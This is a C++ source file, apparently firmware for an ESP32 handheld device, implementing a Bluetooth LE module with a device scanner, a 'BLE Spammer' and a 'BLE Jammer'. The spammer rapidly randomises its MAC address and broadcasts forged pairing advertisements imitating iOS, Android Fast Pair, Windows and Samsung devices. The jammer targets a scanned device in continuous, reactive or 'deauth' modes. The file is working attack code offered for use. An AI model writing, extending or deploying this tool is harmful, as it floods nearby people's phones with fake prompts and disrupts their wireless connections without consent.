#include "ble-module.h"
#include <esp_mac.h>
#include <esp_bt.h>
#include <algorithm>

void BLEModule::init() {
    currentState = MENU;
    menuIndex = 0;
    selectedIndex = 0;
    scrollOffset = 0;
    isScanning = false;
    isSpamming = false;
    currentSpamType = IOS_POPUP;
    lastSpamUpdate = 0;
    lastScanTime = 0;
    isJamming = false;
    currentJammerMode = JAM_CONTINUOUS;
    jammerMenuIndex = 0;

    // Initialize BLE with error handling
    BLEDevice::deinit(true);
    delay(50);
    BLEDevice::init("ESP-Chain");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); 
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    
    pBLEScan = BLEDevice::getScan();
    if (pBLEScan) {
        pBLEScan->setActiveScan(true);
        pBLEScan->setInterval(100);
        pBLEScan->setWindow(99);
    }
    
    pAdvertising = BLEDevice::getAdvertising();
    if (pAdvertising) {
        pAdvertising->addServiceUUID("1234");
        pAdvertising->setScanResponse(true);
        pAdvertising->setMinPreferred(0x06);  
        pAdvertising->setMinPreferred(0x12);
    }
    
    // Initialize BLE jammer utilities
    BLEJammerUtils::init();
    
    initialized = true;
}

void BLEModule::loop() {
    // Run jammer loop if active
    if (currentState == JAMMER && isJamming) {
        BLEJammerUtils::loop();
    }
    
    if (currentState == BLESPAM && isSpamming) {
        // Spam loop - Optimized (40ms cycle approx)
        if (millis() - lastSpamUpdate > 40) { 
            lastSpamUpdate = millis();
            
            // Randomize MAC
            uint8_t mac[6];
            BLESpamUtils::generateRandomMac(mac);
            esp_base_mac_addr_set(mac);
            
            // Re-init BLE to apply MAC change
            // This is heavy but necessary for full MAC randomization with standard library
            BLEDevice::deinit(); 
            BLEDevice::init(""); 
            
            // Re-set power after init
            esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
            
            pAdvertising = BLEDevice::getAdvertising();
            
            // Add random jitter for less predictable patterns (0-10ms)
            delay(random(0, 11));
            
            // Determine Spam Type
            SpamType typeToUse = currentSpamType;
            if (currentSpamType == KITCHEN_SINK) {
                // Randomly select one of the first 4 types
                typeToUse = (SpamType)random(0, 4);
            }

            // Get Payload
            std::vector<uint8_t> payload = BLESpamUtils::getAdvertisementData(typeToUse);
            std::string dataStr((char*)payload.data(), payload.size());
            
            BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
            
            if (typeToUse == ANDROID_PAIR) {
                // Android Fast Pair Service Data
                BLEUUID uuid((uint16_t)0xFE2C);
                oAdvertisementData.setServiceData(uuid, dataStr);
                oAdvertisementData.setCompleteServices(uuid); // Add the UUID announcement
                oAdvertisementData.setFlags(0x06); // General Discoverable + BR/EDR Not Supported
            } else {
                // Manufacturer Data for others (iOS, Windows, Samsung)
                oAdvertisementData.setManufacturerData(dataStr);
            }
            
            pAdvertising->setAdvertisementData(oAdvertisementData);
            pAdvertising->setMinPreferred(0x06);
            pAdvertising->setMinPreferred(0x12);
            pAdvertising->start();
        }
    }
}

void BLEModule::startScan() {
    isScanning = true;
    if (!pBLEScan) {
        pBLEScan = BLEDevice::getScan();
    }
    if (!pBLEScan) return; // Still null, can't scan
    
    // Don't clear immediately if we want to keep old results while scanning?
    // But for a fresh scan, we should clear.
    foundDevices.clear();
    foundAddresses.clear();
    foundRSSIs.clear();
    foundUUIDs.clear();
    
    // Reset selection on new scan
    selectedIndex = 0;
    scrollOffset = 0;
    
    // Scan for 1 second (blocking)
    BLEScanResults found = pBLEScan->start(1, false);
    
    int count = found.getCount();
    for (int i = 0; i < count; i++) {
        BLEAdvertisedDevice device = found.getDevice(i);
        
        // Copy strings immediately while device is valid
        std::string nameStd = device.getName();
        std::string addrStd = device.getAddress().toString();
        String name = String(nameStd.c_str());
        String address = String(addrStd.c_str());
        int rssi = device.getRSSI();
        
        // Get service UUID and identify device type
        String uuidInfo = "";
        if (device.haveServiceUUID()) {
            BLEUUID serviceUUID = device.getServiceUUID();
            std::string uuidStr = serviceUUID.toString();
            String uuid = String(uuidStr.c_str());
            
            // Identify common device types by UUID
            if (uuid.indexOf("180a") >= 0) {
                uuidInfo = "[Device Info]";
            } else if (uuid.indexOf("180f") >= 0) {
                uuidInfo = "[Battery]";
            } else if (uuid.indexOf("1812") >= 0) {
                uuidInfo = "[HID]";
            } else if (uuid.indexOf("181c") >= 0) {
                uuidInfo = "[User Data]";
            } else if (uuid.indexOf("fe2c") >= 0) {
                uuidInfo = "[FastPair]";
            } else if (uuid.indexOf("fd6f") >= 0) {
                uuidInfo = "[Exposure]";
            } else if (uuid.indexOf("fee7") >= 0 || uuid.indexOf("fee9") >= 0) {
                uuidInfo = "[Tile]";
            } else if (uuid.indexOf("feaa") >= 0) {
                uuidInfo = "[Eddystone]";
            } else if (uuid.indexOf("181a") >= 0) {
                uuidInfo = "[Enviro Sens]";
            } else if (uuid.indexOf("1816") >= 0) {
                uuidInfo = "[Cycling]";
            } else if (uuid.indexOf("1818") >= 0) {
                uuidInfo = "[Cycling Pwr]";
            } else if (uuid.indexOf("1826") >= 0) {
                uuidInfo = "[Fitness]";
            } else {
                uuidInfo = "[" + uuid.substring(0, 8) + "]";
            }
        } else {
            uuidInfo = "[No UUID]";
        }
        
        if (name.length() == 0) {
            name = address;
        }
        foundDevices.push_back(name);
        foundAddresses.push_back(address);
        foundRSSIs.push_back(rssi);
        foundUUIDs.push_back(uuidInfo);
    }
    
    // Sort devices: prioritize those with UUID and/or name
    // Create indices array for sorting
    std::vector<int> indices(foundDevices.size());
    for (int i = 0; i < indices.size(); i++) {
        indices[i] = i;
    }
    
    // Sort indices based on priority: name+UUID > name OR UUID > neither
    std::sort(indices.begin(), indices.end(), [this](int a, int b) {
        bool aHasName = (foundDevices[a] != foundAddresses[a]);
        bool bHasName = (foundDevices[b] != foundAddresses[b]);
        bool aHasUUID = (foundUUIDs[a] != "[No UUID]");
        bool bHasUUID = (foundUUIDs[b] != "[No UUID]");
        
        int aPriority = (aHasName ? 2 : 0) + (aHasUUID ? 1 : 0);
        int bPriority = (bHasName ? 2 : 0) + (bHasUUID ? 1 : 0);
        
        if (aPriority != bPriority) {
            return aPriority > bPriority; // Higher priority first
        }
        // If same priority, sort by RSSI (stronger signal first)
        return foundRSSIs[a] > foundRSSIs[b];
    });
    
    // Reorder all vectors based on sorted indices
    std::vector<String> sortedDevices, sortedAddresses, sortedUUIDs;
    std::vector<int> sortedRSSIs;
    
    for (int idx : indices) {
        sortedDevices.push_back(foundDevices[idx]);
        sortedAddresses.push_back(foundAddresses[idx]);
        sortedRSSIs.push_back(foundRSSIs[idx]);
        sortedUUIDs.push_back(foundUUIDs[idx]);
    }
    
    foundDevices = sortedDevices;
    foundAddresses = sortedAddresses;
    foundRSSIs = sortedRSSIs;
    foundUUIDs = sortedUUIDs;
    
    pBLEScan->clearResults();
    lastScanTime = millis();
    isScanning = false; // Scan finished
}

void BLEModule::stopScan() {
    isScanning = false;
    if (pBLEScan) {
        pBLEScan->stop();
    }
}

void BLEModule::toggleSpam() {
    isSpamming = !isSpamming;
    if (!isSpamming && pAdvertising) {
        pAdvertising->stop();
    }
}

void BLEModule::selectDeviceForJammer(int index) {
    if (index < 0 || index >= foundDevices.size()) return;
    
    BLETargetDevice target;
    target.name = foundDevices[index];
    target.address = foundAddresses[index];
    target.rssi = foundRSSIs[index];
    target.isConnectable = false;
    target.serviceUUID = foundUUIDs[index];
    
    BLEJammerUtils::setTarget(target);
}

void BLEModule::toggleJammer() {
    isJamming = !isJamming;
    
    if (isJamming) {
        BLEJammerUtils::startJamming(currentJammerMode);
    } else {
        BLEJammerUtils::stopJamming();
    }
}

void BLEModule::drawMenu(DisplayManager* display) {
    // display->clearContent();
    
    // Null check
    if (!display) return;
    
    // Store display pointer for redraws
    this->displayManager = display;
    
    if (currentState == MENU) {
        display->clearMenu();
        display->drawMenuTitle("BLE Tools");
        display->drawMenuItem("BLE Scanner", 0, menuIndex == 0);
        display->drawMenuItem("BLE Spammer", 1, menuIndex == 1);
        display->drawMenuItem("BLE Jammer", 2, menuIndex == 2);
        display->updateMenu();
    } 
    else if (currentState == SCANNER) {
        String title = "Scanner";

        display->drawMenuTitle(title);
        
        if (foundDevices.empty()) {
            display->clearContent();
            display->getTFT()->setTextColor(TFT_WHITE);
            display->getTFT()->setTextDatum(TL_DATUM);
            display->getTFT()->drawString(isScanning ? "Scanning..." : "No devices", 10, 40, 2);
        } else {
            display->clearMenu();
            // Draw list with UUID info
            int itemsPerPage = 5; // Assuming 5 fits
            int count = foundDevices.size();
            
            for (int i = 0; i < itemsPerPage; i++) {
                int idx = scrollOffset + i;
                if (idx >= count) break;
                
                // Truncate device name if too long to fit UUID
                String deviceName = foundDevices[idx];
                if (deviceName.length() > 12) {
                    deviceName = deviceName.substring(0, 12);
                }
                
                String label = deviceName + " " + foundUUIDs[idx] + " " + String(foundRSSIs[idx]);
                display->drawMenuItem(label, i, selectedIndex == idx);
            }
            display->drawScrollBar(count, scrollOffset, itemsPerPage);
            display->updateMenu();
        }
    }
    else if (currentState == BLESPAM) {
        display->clearContent();
        display->drawMenuTitle("Spammer");
        display->getTFT()->setTextColor(TFT_WHITE);
        display->getTFT()->setTextDatum(TL_DATUM);
        
        String status = "Status: " + String(isSpamming ? "RUNNING" : "STOPPED");
        display->getTFT()->drawString(status, 10, 40, 2);
        
        String typeStr = "Type: ";
        switch(currentSpamType) {
            case IOS_POPUP: typeStr += "iOS"; break;
            case ANDROID_PAIR: typeStr += "Android"; break;
            case WINDOWS_PAIR: typeStr += "Windows"; break;
            case SAMSUNG_PAIR: typeStr += "Samsung"; break;
            case KITCHEN_SINK: typeStr += "Kitchen Sink"; break;
        }
        display->getTFT()->drawString(typeStr, 10, 65, 2);
        
        display->getTFT()->drawString("UP/DN: Change Type", 10, 90, 2);
        display->getTFT()->drawString("SELECT: Start/Stop", 10, 110, 2);
    }
    else if (currentState == JAMMER) {
        display->clearContent();
        display->drawMenuTitle("Jammer");
        display->getTFT()->setTextColor(TFT_WHITE);
        display->getTFT()->setTextDatum(TL_DATUM);
        
        String status = "Status: " + String(isJamming ? "JAMMING" : "STOPPED");
        display->getTFT()->drawString(status, 10, 40, 2);
        
        if (BLEJammerUtils::hasTarget()) {
            String target = "Target: " + BLEJammerUtils::getTargetName();
            display->getTFT()->drawString(target, 10, 60, 2);
            
            String rssi = "RSSI: " + String(BLEJammerUtils::getTargetRSSI());
            display->getTFT()->drawString(rssi, 10, 80, 2);
        } else {
            display->getTFT()->drawString("No target set", 10, 60, 2);
        }
        
        String modeStr = "Mode: ";
        switch(currentJammerMode) {
            case JAM_CONTINUOUS: modeStr += "Continuous"; break;
            case JAM_REACTIVE: modeStr += "Reactive"; break;
            case JAM_DEAUTH: modeStr += "Deauth"; break;
        }
        display->getTFT()->drawString(modeStr, 10, 100, 2);
        
        if (isJamming) {
            String packets = "Packets: " + String(BLEJammerUtils::getPacketCount());
            display->getTFT()->drawString(packets, 10, 120, 2);
        }
    }
}

bool BLEModule::handleInput(uint8_t button) {
    // 0=Up, 1=Down, 2=Select, 3=Back
    
    // Safety check - ensure displayManager is valid
    if (!displayManager) return true;
    
    if (currentState == MENU) {
        if (button == 0) { // Up
            menuIndex--;
            if (menuIndex < 0) menuIndex = 2;
            drawMenu(displayManager); // Force redraw
        } else if (button == 1) { // Down
            menuIndex++;
            if (menuIndex > 2) menuIndex = 0;
            drawMenu(displayManager); // Force redraw
        } else if (button == 2) { // Select
            if (menuIndex == 0) {
                currentState = SCANNER;
                startScan();
            } else if (menuIndex == 1) {
                currentState = BLESPAM;
            } else if (menuIndex == 2) {
                currentState = JAMMER;
            }
            delay(50); // Give time for state change
            drawMenu(displayManager); // Force redraw
        } else if (button == 3) { // Back
            // Stop everything when exiting module
            stopScan();
            if (isSpamming) toggleSpam();
            if (isJamming) toggleJammer();

            return false; // Exit module
        }
    }
    else if (currentState == SCANNER) {
        if (button == 0) { // Up
            if (foundDevices.size() > 0) {
                selectedIndex--;
                if (selectedIndex < 0) {
                    selectedIndex = foundDevices.size() - 1; // Wrap around
                }
                
                // Adjust scroll offset
                if (selectedIndex < scrollOffset) {
                    scrollOffset = selectedIndex;
                } else if (selectedIndex >= scrollOffset + 5) {
                    scrollOffset = selectedIndex - 4;
                }
                drawMenu(displayManager); // Force redraw
            }
        } else if (button == 1) { // Down
            if (foundDevices.size() > 0) {
                selectedIndex++;
                if (selectedIndex >= foundDevices.size()) {
                    selectedIndex = 0; // Wrap around
                }
                
                // Adjust scroll offset
                if (selectedIndex >= scrollOffset + 5) {
                    scrollOffset = selectedIndex - 4;
                } else if (selectedIndex < scrollOffset) {
                    scrollOffset = selectedIndex;
                }
                drawMenu(displayManager); // Force redraw
            }
        } else if (button == 2) { // Select - Select device for jammer
            if (foundDevices.size() > 0 && selectedIndex < foundDevices.size()) {
                selectDeviceForJammer(selectedIndex);
                currentState = JAMMER;
            }
            drawMenu(displayManager);
        } else if (button == 3) { // Back
            stopScan();
            currentState = MENU;
            drawMenu(displayManager); // Force redraw
        }
    }
    else if (currentState == BLESPAM) {
        if (button == 0) { // Up
            int type = (int)currentSpamType;
            type--;
            if (type < 0) type = 4; // KITCHEN_SINK
            currentSpamType = (SpamType)type;
            drawMenu(displayManager);
        } else if (button == 1) { // Down
            int type = (int)currentSpamType;
            type++;
            if (type > 4) type = 0; // IOS_POPUP
            currentSpamType = (SpamType)type;
            drawMenu(displayManager);
        } else if (button == 2) { // Select
            toggleSpam();
            drawMenu(displayManager); // Force redraw
        } else if (button == 3) { // Back
            if (isSpamming) toggleSpam();
            currentState = MENU;
            drawMenu(displayManager); // Force redraw
        }
    }
    else if (currentState == JAMMER) {
        if (button == 0) { // Up - Change mode
            int mode = (int)currentJammerMode;
            mode--;
            if (mode < 0) mode = 2; // JAM_DEAUTH
            currentJammerMode = (JammerMode)mode;
            BLEJammerUtils::setMode(currentJammerMode);
            drawMenu(displayManager);
        } else if (button == 1) { // Down - Change mode
            int mode = (int)currentJammerMode;
            mode++;
            if (mode > 2) mode = 0; // JAM_CONTINUOUS
            currentJammerMode = (JammerMode)mode;
            BLEJammerUtils::setMode(currentJammerMode);
            drawMenu(displayManager);
        } else if (button == 2) { // Select - Toggle jamming
            if (BLEJammerUtils::hasTarget()) {
                toggleJammer();
                drawMenu(displayManager);
            }
        } else if (button == 3) { // Back
            if (isJamming) toggleJammer();
            currentState = MENU;
            drawMenu(displayManager);
        }
    }
    
    return true;
}
